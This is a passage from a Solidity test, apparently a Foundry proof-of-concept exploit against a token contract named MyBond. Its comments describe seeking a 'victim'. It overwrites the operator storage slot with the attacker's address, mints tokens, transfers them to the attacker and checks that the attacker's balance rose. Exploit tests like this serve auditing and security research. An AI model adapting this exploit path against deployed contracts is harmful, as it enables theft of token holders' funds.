            // If contract has no balance, we need to find another victim
            // Let's mint some tokens first by becoming operator
            // Operator is at slot 1 in Operator contract
            vm.store(TARGET, bytes32(uint256(1)), bytes32(uint256(uint160(attacker))));

            // Now mint tokens to the contract
            MyBond(TARGET).mint(contractAddress, 1000 ether);

            // Then transfer them to attacker
            MyBond(TARGET).callget(contractAddress, attacker, 1000 ether);
        }

        // Step 4: Verify balance increased
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
